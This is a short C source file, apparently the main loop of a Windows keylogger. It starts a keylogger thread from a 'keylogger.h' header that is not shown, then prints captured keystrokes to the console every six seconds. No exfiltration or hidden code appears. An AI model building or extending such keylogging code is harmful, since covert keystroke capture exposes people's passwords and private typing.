#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "keylogger.h"


void main()
{
	char key[20];

	// create new queue for keys pressed
	struct QueueKeylog* q = createQueueKeylog();

	//start key logger thread
	HANDLE thread = startKeylogger(q);
    while(1)
    {
        while(getKeylog(q,key))
        {
            printf("%s",key);
        }
        Sleep(6000);
    }
}
